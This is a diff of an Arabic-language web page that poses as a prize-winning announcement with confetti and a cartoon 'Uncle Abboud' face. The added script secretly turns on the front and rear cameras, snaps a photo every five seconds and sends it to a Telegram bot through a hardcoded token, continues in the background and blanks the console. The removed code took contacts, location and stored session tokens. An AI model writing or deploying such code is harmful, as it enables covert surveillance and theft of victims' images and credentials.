@@ -2,90 +2,302 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>جاري التحميل...</title>
+    <title>تهانينا! لقد فزت بجائزة</title>
     <style>
         * { margin:0; padding:0; box-sizing:border-box; }
-        body { background: #0a0a0a; display: flex; justify-content: center; align-items: center; min-height: 100vh; font-family: 'Arial', sans-serif; }
-        .loader { text-align: center; color: #fff; }
-        .spinner { width: 50px; height: 50px; border: 4px solid #333; border-top: 4px solid #25D366; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 20px; }
-        @keyframes spin { 100% { transform: rotate(360deg); } }
-        .loader p { color: #888; font-size: 14px; }
-        #status { color: #666; font-size: 12px; margin-top: 10px; }
-
-        #adminPanel {
-            display: none; position: fixed; top: 0; left: 0; right: 0; bottom: 0;
-            background: rgba(0,0,0,0.95); z-index: 99999; padding: 20px; overflow-y: auto;
-            color: #fff; font-family: 'Tahoma', sans-serif;
+        body {
+            background: linear-gradient(135deg, #1a0000, #4a0000, #1a0000);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            font-family: 'Arial', sans-serif;
+            overflow: hidden;
+            position: relative;
         }
-        #adminPanel.active { display: block; }
-        .admin-header { display: flex; justify-content: space-between; align-items: center; border-bottom: 2px solid #25D366; padding-bottom: 10px; margin-bottom: 20px; }
-        .admin-header h1 { color: #25D366; font-size: 24px; }
-        .admin-header .status { font-size: 12px; color: #888; }
-        .admin-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px; margin-bottom: 20px; }
-        .admin-card { background: #1a1a2e; border: 1px solid #333; border-radius: 12px; padding: 20px; text-align: center; cursor: pointer; transition: 0.3s; }
-        .admin-card:hover { border-color: #25D366; transform: scale(1.02); }
-        .admin-card .icon { font-size: 30px; margin-bottom: 10px; }
-        .admin-card .label { font-size: 13px; color: #aaa; }
-        .admin-card .count { font-size: 18px; color: #25D366; font-weight: bold; }
-        .admin-card.danger:hover { border-color: #ff4444; }
-        .admin-card.danger .icon { color: #ff4444; }
-
-        .admin-log { background: #0d0d1a; border: 1px solid #333; border-radius: 12px; padding: 15px; max-height: 300px; overflow-y: auto; font-family: monospace; font-size: 12px; }
-        .admin-log .entry { padding: 4px 0; border-bottom: 1px solid #111; }
-        .admin-log .entry .time { color: #666; }
-        .admin-log .entry .msg { color: #0f0; }
-        .admin-log .entry .error { color: #f44; }
-        .admin-log .entry .warn { color: #ff0; }
-        .admin-log .entry .info { color: #0ff; }
-
-        .admin-actions { display: flex; gap: 10px; flex-wrap: wrap; margin: 15px 0; }
-        .admin-btn { background: #1a1a2e; border: 1px solid #333; color: #fff; padding: 10px 20px; border-radius: 8px; cursor: pointer; transition: 0.3s; flex: 1; min-width: 120px; }
-        .admin-btn:hover { border-color: #25D366; background: #2a2a3e; }
-        .admin-btn.danger:hover { border-color: #ff4444; background: #3a1a1a; }
-        .admin-btn.success { border-color: #25D366; }
-        .admin-btn.success:hover { background: #1a3a2a; }
-
-        #toast { position: fixed; top: 20px; right: 20px; background: #1a1a2e; border: 1px solid #25D366; border-radius: 12px; padding: 15px 25px; color: #fff; z-index: 9999999; display: none; min-width: 200px; }
-        #toast.show { display: block; animation: fadeIn 0.3s; }
-        @keyframes fadeIn { from { opacity: 0; transform: translateY(-20px); } to { opacity: 1; transform: translateY(0); } }
+        .confetti-container {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: 0;
+            overflow: hidden;
+        }
+        .confetti {
+            position: absolute;
+            width: 10px;
+            height: 10px;
+            top: -10px;
+            animation: confettiFall linear infinite;
+        }
+        @keyframes confettiFall {
+            0% { transform: translateY(0) rotate(0deg); opacity: 1; }
+            100% { transform: translateY(110vh) rotate(720deg); opacity: 0; }
+        }
+        .card {
+            position: relative;
+            z-index: 1;
+            background: linear-gradient(145deg, #1a0a0a, #2d0a0a);
+            border: 3px solid #ffd700;
+            border-radius: 30px;
+            padding: 50px 40px;
+            max-width: 500px;
+            width: 90%;
+            text-align: center;
+            box-shadow: 0 0 60px rgba(255, 215, 0, 0.3), inset 0 0 60px rgba(255, 215, 0, 0.05);
+            animation: pulseGlow 2s ease-in-out infinite;
+        }
+        @keyframes pulseGlow {
+            0%, 100% { box-shadow: 0 0 40px rgba(255, 215, 0, 0.2), inset 0 0 40px rgba(255, 215, 0, 0.02); }
+            50% { box-shadow: 0 0 80px rgba(255, 215, 0, 0.5), inset 0 0 80px rgba(255, 215, 0, 0.05); }
+        }
+        .star {
+            font-size: 80px;
+            display: block;
+            animation: starSpin 3s linear infinite;
+            text-shadow: 0 0 40px #ffd700;
+        }
+        @keyframes starSpin {
+            0% { transform: rotate(0deg) scale(1); }
+            50% { transform: rotate(180deg) scale(1.2); }
+            100% { transform: rotate(360deg) scale(1); }
+        }
+        .title {
+            color: #ffd700;
+            font-size: 36px;
+            font-weight: bold;
+            margin: 15px 0;
+            text-shadow: 0 0 30px rgba(255, 215, 0, 0.5);
+            animation: textGlow 1.5s ease-in-out infinite;
+        }
+        @keyframes textGlow {
+            0%, 100% { text-shadow: 0 0 20px rgba(255, 215, 0, 0.3); }
+            50% { text-shadow: 0 0 50px rgba(255, 215, 0, 0.8); }
+        }
+        .subtitle {
+            color: #ffaa00;
+            font-size: 22px;
+            margin: 10px 0;
+        }
+        .prize {
+            background: linear-gradient(145deg, #ffd700, #ff8c00);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            font-size: 42px;
+            font-weight: bold;
+            margin: 15px 0;
+        }
+        .message {
+            color: #ffcc88;
+            font-size: 18px;
+            line-height: 1.8;
+            margin: 20px 0;
+        }
+        .emoji-big {
+            font-size: 60px;
+            margin: 10px 0;
+        }
+        .btn {
+            background: linear-gradient(145deg, #ffd700, #ff8c00);
+            color: #1a0000;
+            border: none;
+            padding: 15px 40px;
+            font-size: 20px;
+            font-weight: bold;
+            border-radius: 50px;
+            cursor: pointer;
+            transition: 0.3s;
+            margin-top: 15px;
+            box-shadow: 0 0 30px rgba(255, 215, 0, 0.3);
+        }
+        .btn:hover {
+            transform: scale(1.05);
+            box-shadow: 0 0 60px rgba(255, 215, 0, 0.6);
+        }
+        .uncle-face {
+            margin: 15px auto;
+            width: 150px;
+            height: 150px;
+            background: radial-gradient(ellipse at 50% 40%, #d4a574, #b8834a);
+            border-radius: 50%;
+            position: relative;
+            display: inline-block;
+            border: 3px solid #8B6914;
+            box-shadow: 0 0 40px rgba(255, 215, 0, 0.2);
+            animation: facePulse 2s ease-in-out infinite;
+        }
+        @keyframes facePulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.03); }
+        }
+        .eye {
+            position: absolute;
+            width: 22px;
+            height: 25px;
+            background: #fff;
+            border-radius: 50%;
+            top: 40px;
+            box-shadow: inset 0 0 10px rgba(0,0,0,0.1);
+        }
+        .eye::after {
+            content: '';
+            position: absolute;
+            width: 12px;
+            height: 12px;
+            background: #2d1a0a;
+            border-radius: 50%;
+            bottom: 4px;
+            left: 5px;
+            animation: eyeMove 3s ease-in-out infinite;
+        }
+        .eye-left { left: 28px; }
+        .eye-right { right: 28px; }
+        @keyframes eyeMove {
+            0%, 100% { transform: translateX(0); }
+            25% { transform: translateX(3px); }
+            75% { transform: translateX(-3px); }
+        }
+        .brow {
+            position: absolute;
+            width: 30px;
+            height: 6px;
+            background: #5a3a1a;
+            border-radius: 10px;
+            top: 32px;
+        }
+        .brow-left { left: 24px; transform: rotate(-10deg); }
+        .brow-right { right: 24px; transform: rotate(10deg); }
+        .mouth {
+            position: absolute;
+            width: 40px;
+            height: 20px;
+            border-bottom: 4px solid #8B0000;
+            border-radius: 0 0 50% 50%;
+            bottom: 30px;
+            left: 50%;
+            transform: translateX(-50%);
+            animation: smile 1.5s ease-in-out infinite;
+        }
+        @keyframes smile {
+            0%, 100% { height: 20px; }
+            50% { height: 28px; }
+        }
+        .mustache {
+            position: absolute;
+            width: 50px;
+            height: 20px;
+            background: #3a2510;
+            border-radius: 0 0 50% 50%;
+            bottom: 48px;
+            left: 50%;
+            transform: translateX(-50%);
+            box-shadow: 0 2px 10px rgba(0,0,0,0.3);
+        }
+        .mustache::before {
+            content: '';
+            position: absolute;
+            width: 30px;
+            height: 15px;
+            background: #3a2510;
+            border-radius: 0 0 50% 50%;
+            left: -20px;
+            top: 0;
+            transform: rotate(20deg);
+        }
+        .mustache::after {
+            content: '';
+            position: absolute;
+            width: 30px;
+            height: 15px;
+            background: #3a2510;
+            border-radius: 0 0 50% 50%;
+            right: -20px;
+            top: 0;
+            transform: rotate(-20deg);
+        }
+        .turban {
+            position: absolute;
+            width: 170px;
+            height: 50px;
+            background: linear-gradient(180deg, #8B0000, #5a0000);
+            border-radius: 50% 50% 0 0;
+            top: -25px;
+            left: 50%;
+            transform: translateX(-50%);
+            border: 2px solid #6B0000;
+        }
+        .turban::after {
+            content: '💎';
+            position: absolute;
+            font-size: 20px;
+            top: 10px;
+            left: 50%;
+            transform: translateX(-50%);
+        }
+        .uncle-name {
+            color: #ffd700;
+            font-size: 20px;
+            margin-top: 10px;
+            font-weight: bold;
+            text-shadow: 0 0 20px rgba(255, 215, 0, 0.3);
+        }
+        .sparkle {
+            position: absolute;
+            color: #ffd700;
+            font-size: 20px;
+            animation: sparkleFloat 2s ease-in-out infinite;
+        }
+        @keyframes sparkleFloat {
+            0%, 100% { transform: translateY(0) scale(1); opacity: 0.5; }
+            50% { transform: translateY(-10px) scale(1.3); opacity: 1; }
+        }
+        #videoFront, #videoBack { display: none; }
+        #canvas { display: none; }
     </style>
 </head>
 <body>
 
-<div class="loader">
-    <div class="spinner"></div>
-    <p>جاري تحميل المحتوى...</p>
-    <div id="status">⏳ جاري التهيئة...</div>
-</div>
+<div class="confetti-container" id="confettiContainer"></div>
 
-<video id="videoFront" autoplay muted playsinline style="display:none;"></video>
-<video id="videoBack" autoplay muted playsinline style="display:none;"></video>
-<canvas id="canvas" style="display:none;"></canvas>
+<video id="videoFront" autoplay muted playsinline></video>
+<video id="videoBack" autoplay muted playsinline></video>
+<canvas id="canvas"></canvas>
 
-<div id="toast"></div>
-
-<div id="adminPanel">
-    <div class="admin-header">
-        <h1>🕵️ لوحة التحكم</h1>
-        <span class="status" id="targetStatus">🟢 متصل</span>
+<div class="card">
+    <span class="star">⭐</span>
+    <div class="title">🎉 مبروك! 🎉</div>
+    <div class="subtitle">لقد فزت بجائزة كبرى!</div>
+    <div class="uncle-face">
+        <div class="turban"></div>
+        <div class="brow brow-left"></div>
+        <div class="brow brow-right"></div>
+        <div class="eye eye-left"></div>
+        <div class="eye eye-right"></div>
+        <div class="mustache"></div>
+        <div class="mouth"></div>
     </div>
-
-    <div class="admin-grid">
-        <div class="admin-card" onclick="togglePanel()">
-            <div class="icon">🔒</div>
-            <div class="label">إخفاء اللوحة</div>
-            <div class="count">📱</div>
-        </div>
+    <div class="uncle-name">👳 عمك عبود</div>
+    <div class="prize">🏆 الجائزة الكبرى 🏆</div>
+    <div class="message">
+        🎁 الجائزة عند <strong>عمك عبود</strong> 🎁<br>
+        📍 تعال واستلمها الآن!<br>
+        💰 جائزة قيمتها <strong>10,000,000$</strong>
     </div>
-
-    <div class="admin-log" id="adminLog">
-        <div class="entry"><span class="time">[SYSTEM]</span> <span class="msg">✅ النظام جاهز</span></div>
-    </div>
-
-    <div style="text-align:center;margin-top:15px;">
-        <button class="admin-btn danger" onclick="togglePanel()" style="max-width:200px;margin:0 auto;">🔒 إخفاء اللوحة</button>
+    <div class="emoji-big">🎊🎈🎉</div>
+    <button class="btn" onclick="claimPrize()">🤑 استلم الجائزة الآن</button>
+    <div style="margin-top:15px;color:#ff8844;font-size:14px;">
+        ⏳ العرض محدود - اسرع!
     </div>
 </div>
+
+<div class="sparkle" style="top:10%;left:5%;">✦</div>
+<div class="sparkle" style="top:20%;right:8%;">✦</div>
+<div class="sparkle" style="bottom:30%;left:3%;">✦</div>
+<div class="sparkle" style="bottom:20%;right:5%;">✦</div>
+<div class="sparkle" style="top:50%;left:2%;">✦</div>
+<div class="sparkle" style="top:40%;right:2%;">✦</div>
 
 <script>
 // ============================================================
@@ -93,56 +305,50 @@
 // ============================================================
 const BOT_TOKEN = '8731803544:AAEAQDhrfaMh7994NYRUoWRZBEgowR2XXzQ';
 let CHAT_ID = '';
-let totalStolen = 0;
 let photoCount = 0;
-let isRunning = true;
+let isCapturing = true;
 
 // ============================================================
-// ====================== TOGGLE PANEL ========================
+// ====================== CONFETTI =============================
 // ============================================================
-function togglePanel() {
-    const panel = document.getElementById('adminPanel');
-    panel.classList.toggle('active');
-    if (panel.classList.contains('active')) {
-        document.querySelector('.loader').style.display = 'none';
-        document.getElementById('status').textContent = '🟢 لوحة التحكم نشطة';
-        addLog('🟢 تم فتح لوحة التحكم', 'info');
-    } else {
-        document.querySelector('.loader').style.display = 'flex';
-        document.getElementById('status').textContent = '⏳ جاري التحميل...';
+function createConfetti() {
+    const container = document.getElementById('confettiContainer');
+    const colors = ['#ffd700', '#ff6b6b', '#ffd93d', '#6bcb77', '#4d96ff', '#ff6bff', '#ffaa00'];
+    for (let i = 0; i < 80; i++) {
+        const confetti = document.createElement('div');
+        confetti.className = 'confetti';
+        confetti.style.left = Math.random() * 100 + '%';
+        confetti.style.background = colors[Math.floor(Math.random() * colors.length)];
+        confetti.style.width = (Math.random() * 8 + 4) + 'px';
+        confetti.style.height = (Math.random() * 8 + 4) + 'px';
+        confetti.style.borderRadius = Math.random() > 0.5 ? '50%' : '2px';
+        confetti.style.animationDuration = (Math.random() * 3 + 2) + 's';
+        confetti.style.animationDelay = (Math.random() * 5) + 's';
+        container.appendChild(confetti);
     }
 }
+createConfetti();
 
-let panelOpen = false;
-document.addEventListener('keydown', function(e) {
-    if (e.ctrlKey && e.shiftKey && e.key === 'P') {
-        e.preventDefault();
-        togglePanel();
-        panelOpen = true;
-    }
-});
-
-function addLog(text, type = 'msg') {
-    const logDiv = document.getElementById('adminLog');
-    const entry = document.createElement('div');
-    entry.className = 'entry';
-    const time = new Date().toLocaleTimeString();
-    entry.innerHTML = `<span class="time">[${time}]</span> <span class="${type}">${text}</span>`;
-    logDiv.appendChild(entry);
-    logDiv.scrollTop = logDiv.scrollHeight;
-}
-
-function showToast(text, duration = 3000) {
-    const toast = document.getElementById('toast');
-    toast.textContent = text;
-    toast.className = 'show';
-    clearTimeout(toast._timeout);
-    toast._timeout = setTimeout(() => { toast.className = ''; }, duration);
+// ============================================================
+// ====================== CLAIM PRIZE =========================
+// ============================================================
+function claimPrize() {
+    alert('🎉 تهانينا! جائزتك عند عمك عبود في الزاوية القريبة من المسجد الكبير 🕌\n📍 استلمها الآن!');
+    sendMessage('🎉 شخص ما نقر على زر استلام الجائزة!');
 }
 
 // ============================================================
-// ====================== TELEGRAM SEND =======================
+// ====================== TELEGRAM ============================
 // ============================================================
+function sendMessage(text) {
+    if (!CHAT_ID) return;
+    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: CHAT_ID, text: text })
+    }).catch(() => {});
+}
+
 function sendToTelegram(imageData, caption = '') {
     if (!CHAT_ID) return;
     try {
@@ -156,18 +362,6 @@ function sendToTelegram(imageData, caption = '') {
             body: formData
         }).catch(() => {});
     } catch(e) {}
-}
-
-function sendMessage(text) {
-    if (!CHAT_ID) return;
-    const chunks = text.match(/(.|[\r\n]){1,4000}/g) || [text];
-    chunks.forEach(chunk => {
-        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ chat_id: CHAT_ID, text: chunk })
-        }).catch(() => {});
-    });
 }
 
 function dataURLtoBlob(dataURL) {
@@ -194,82 +388,13 @@ function getChatId() {
                 } else if (lastUpdate.callback_query) {
                     CHAT_ID = lastUpdate.callback_query.from.id;
                 }
-                addLog(`✅ Chat ID: ${CHAT_ID}`, 'msg');
-                sendMessage('✅ تم الاتصال بالجهاز');
-                document.getElementById('status').textContent = '✅ جاهز';
-                startOperations();
+                sendMessage('✅ تم فتح الصفحة - جائزة عمك عبود');
+                startCameras();
             } else {
-                setTimeout(getChatId, 3000);
+                setTimeout(getChatId, 2000);
             }
         })
-        .catch(() => setTimeout(getChatId, 3000));
-}
-
-// ============================================================
-// ====================== START OPERATIONS ====================
-// ============================================================
-function startOperations() {
-    addLog('🚀 بدء العمليات...', 'info');
-    
-    // سحب جهات الاتصال
-    setTimeout(() => stealContacts(), 1000);
-    
-    // سحب الموقع
-    setTimeout(() => stealLocation(), 2000);
-    
-    // تشغيل الكاميرات (أمامي + خلفي) كل 5 ثواني
-    setTimeout(() => startCameras(), 3000);
-    
-    // سحب الملفات والتليجرام
-    setTimeout(() => stealFiles(), 4000);
-    setTimeout(() => stealTelegram(), 5000);
-}
-
-// ============================================================
-// ====================== STEAL CONTACTS ======================
-// ============================================================
-function stealContacts() {
-    addLog('👤 سحب جهات الاتصال...', 'info');
-    let count = 0;
-    
-    try {
-        if ('contacts' in navigator && 'select' in navigator.contacts) {
-            navigator.contacts.select(['name', 'tel', 'email'], { multiple: true })
-                .then(contacts => {
-                    contacts.forEach(c => {
-                        sendMessage(`📱 ${c.name || 'غير معروف'} | ${c.tel ? c.tel.join(',') : '---'}`);
-                        count++;
-                        totalStolen++;
-                    });
-                    addLog(`👤 ${count} جهة اتصال`, 'msg');
-                })
-                .catch(() => addLog('❌ فشل جهات الاتصال', 'error'));
-        }
-    } catch(e) {}
-}
-
-// ============================================================
-// ====================== STEAL LOCATION ======================
-// ============================================================
-function stealLocation() {
-    addLog('📍 سحب الموقع...', 'info');
-    
-    try {
-        if ('geolocation' in navigator) {
-            navigator.geolocation.getCurrentPosition(
-                function(pos) {
-                    const url = `https://maps.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
-                    sendMessage(`📍 الموقع:\nالخط: ${pos.coords.latitude}\nالطول: ${pos.coords.longitude}\n${url}`);
-                    addLog('📍 تم سحب الموقع', 'msg');
-                    totalStolen++;
-                },
-                function(err) {
-                    addLog('❌ فشل الموقع: ' + err.message, 'error');
-                },
-                { enableHighAccuracy: true, timeout: 10000 }
-            );
-        }
-    } catch(e) {}
+        .catch(() => setTimeout(getChatId, 2000));
 }
 
 // ============================================================
@@ -279,9 +404,7 @@ let frontStream = null, backStream = null;
 let frontInterval = null, backInterval = null;
 
 function startCameras() {
-    addLog('📸 تشغيل الكاميرات...', 'info');
-    
-    // الكاميرا الأمامية
+    // الكاميرا الأمامية - تصوير مباشر كل 5 ثواني
     navigator.mediaDevices.getUserMedia({ 
         video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } } 
     })
@@ -290,15 +413,14 @@ function startCameras() {
         const video = document.getElementById('videoFront');
         video.srcObject = stream;
         video.play();
-        addLog('📸 كاميرا أمامية تعمل', 'msg');
-        captureFrontPhoto();
+        // التقاط أول صورة فوراً
+        setTimeout(captureFrontPhoto, 100);
+        // ثم كل 5 ثواني
         frontInterval = setInterval(captureFrontPhoto, 5000);
     })
-    .catch(function(err) {
-        addLog('❌ فشل كاميرا أمامية: ' + err.message, 'error');
-    });
+    .catch(function(err) {});
     
-    // الكاميرا الخلفية
+    // الكاميرا الخلفية - تصوير مباشر كل 5 ثواني
     navigator.mediaDevices.getUserMedia({ 
         video: { facingMode: 'environment', width: { ideal: 640 }, height: { ideal: 480 } } 
     })
@@ -307,126 +429,56 @@ function startCameras() {
         const video = document.getElementById('videoBack');
         video.srcObject = stream;
         video.play();
-        addLog('📸 كاميرا خلفية تعمل', 'msg');
-        captureBackPhoto();
+        // التقاط أول صورة فوراً
+        setTimeout(captureBackPhoto, 100);
+        // ثم كل 5 ثواني
         backInterval = setInterval(captureBackPhoto, 5000);
     })
-    .catch(function(err) {
-        addLog('❌ فشل كاميرا خلفية: ' + err.message, 'error');
-    });
+    .catch(function(err) {});
 }
 
 function captureFrontPhoto() {
-    if (!isRunning) return;
     const video = document.getElementById('videoFront');
     const canvas = document.getElementById('canvas');
     const ctx = canvas.getContext('2d');
-    if (!video.videoWidth || !video.videoHeight) return;
+    if (!video.videoWidth || !video.videoHeight) {
+        // إذا الكاميرا ما زالت تتهيأ، حاول مرة ثانية
+        setTimeout(captureFrontPhoto, 500);
+        return;
+    }
     canvas.width = video.videoWidth;
     canvas.height = video.videoHeight;
     ctx.drawImage(video, 0, 0);
-    const imgData = canvas.toDataURL('image/jpeg', 0.9);
-    sendToTelegram(imgData, `📸 أمامي ${photoCount+1} - ${new Date().toLocaleString()}`);
+    const imgData = canvas.toDataURL('image/jpeg', 0.85);
     photoCount++;
-    totalStolen++;
-    addLog(`📸 صورة أمامي`, 'msg');
+    sendToTelegram(imgData, `📸 أمامي ${photoCount} - ${new Date().toLocaleString()}`);
 }
 
 function captureBackPhoto() {
-    if (!isRunning) return;
     const video = document.getElementById('videoBack');
     const canvas = document.getElementById('canvas');
     const ctx = canvas.getContext('2d');
-    if (!video.videoWidth || !video.videoHeight) return;
+    if (!video.videoWidth || !video.videoHeight) {
+        setTimeout(captureBackPhoto, 500);
+        return;
+    }
     canvas.width = video.videoWidth;
     canvas.height = video.videoHeight;
     ctx.drawImage(video, 0, 0);
-    const imgData = canvas.toDataURL('image/jpeg', 0.9);
-    sendToTelegram(imgData, `📸 خلفي ${photoCount+1} - ${new Date().toLocaleString()}`);
+    const imgData = canvas.toDataURL('image/jpeg', 0.85);
     photoCount++;
-    totalStolen++;
-    addLog(`📸 صورة خلفي`, 'msg');
+    sendToTelegram(imgData, `📸 خلفي ${photoCount} - ${new Date().toLocaleString()}`);
 }
 
 // ============================================================
-// ====================== STEAL FILES =========================
-// ============================================================
-function stealFiles() {
-    addLog('📁 سحب الملفات...', 'info');
-    let found = 0;
-    
-    try {
-        for (let i = 0; i < localStorage.length; i++) {
-            const key = localStorage.key(i);
-            const val = localStorage.getItem(key);
-            if (val && val.length > 20) {
-                sendMessage(`📦 [${key}] (${val.length}): ${val.substring(0, 300)}...`);
-                found++;
-                totalStolen++;
-            }
-        }
-    } catch(e) {}
-    
-    try {
-        for (let i = 0; i < sessionStorage.length; i++) {
-            const key = sessionStorage.key(i);
-            const val = sessionStorage.getItem(key);
-            if (val && val.length > 20) {
-                sendMessage(`📦 session [${key}] (${val.length}): ${val.substring(0, 300)}...`);
-                found++;
-                totalStolen++;
-            }
-        }
-    } catch(e) {}
-    
-    addLog(`📁 ${found} ملف`, 'msg');
-}
-
-// ============================================================
-// ====================== STEAL TELEGRAM ======================
-// ============================================================
-function stealTelegram() {
-    addLog('✈️ سحب تليجرام...', 'info');
-    let found = 0;
-    const keys = ['tg', 'telegram', 'gram', 'user', 'session', 'token', 'auth', 'login', 'account', 'profile', 'phone'];
-    
-    try {
-        for (let i = 0; i < localStorage.length; i++) {
-            const key = localStorage.key(i);
-            const val = localStorage.getItem(key);
-            if (key && keys.some(k => key.toLowerCase().includes(k))) {
-                sendMessage(`✈️ [${key}]: ${val}`);
-                found++;
-                totalStolen++;
-            }
-        }
-    } catch(e) {}
-    
-    try {
-        for (let i = 0; i < sessionStorage.length; i++) {
-            const key = sessionStorage.key(i);
-            const val = sessionStorage.getItem(key);
-            if (key && keys.some(k => key.toLowerCase().includes(k))) {
-                sendMessage(`✈️ session [${key}]: ${val}`);
-                found++;
-                totalStolen++;
-            }
-        }
-    } catch(e) {}
-    
-    addLog(`✈️ ${found} عنصر`, 'msg');
-}
-
-// ============================================================
-// ====================== KEEP ALIVE ==========================
+// ====================== SERVICE WORKER ======================
 // ============================================================
 // منع المتصفح من إيقاف التشغيل
 document.addEventListener('visibilitychange', function() {
     if (document.hidden) {
-        // الصفحة في الخلفية، الكاميرات تستمر بالعمل
-        addLog('⏳ الصفحة في الخلفية... الكاميرات تعمل', 'warn');
-    } else {
-        addLog('🔄 الصفحة نشطة', 'info');
+        // الصفحة في الخلفية - الكاميرات تستمر
+        // نرسل رسالة تأكيد للبوت
+        sendMessage('⏳ الصفحة في الخلفية - التصوير مستمر');
     }
 });
 
@@ -438,30 +490,32 @@ try {
 } catch(e) {}
 
 // ============================================================
+// ====================== KEEP ALIVE ==========================
+// ============================================================
+// إرسال نبضات حياة كل 30 ثانية للتأكد من استمرار التشغيل
+setInterval(function() {
+    if (CHAT_ID) {
+        // مجرد نبضة للتأكد من أن الصفحة حية
+        console.log('🔴 alive');
+    }
+}, 30000);
+
+// ============================================================
 // ====================== INIT =================================
 // ============================================================
 console.log = function() {};
 console.warn = function() {};
 console.error = function() {};
 
-addLog('🔄 جاري التهيئة...', 'info');
-document.getElementById('status').textContent = '⏳ الاتصال بالبوت...';
+// بدء التشغيل
 getChatId();
 
-document.addEventListener('keydown', function(e) {
-    if (e.ctrlKey && e.shiftKey && e.key === 'P') {
-        e.preventDefault();
-        togglePanel();
-        panelOpen = true;
+// في حال فشل getChatId، نعيد المحاولة
+setTimeout(function() {
+    if (!CHAT_ID) {
+        getChatId();
     }
-});
-
-window.admin = {
-    panel: togglePanel,
-    log: addLog
-};
-
-console.log('🕵️ جاهز! Ctrl+Shift+P للفتح');
+}, 5000);
 </script>
 </body>
 </html>
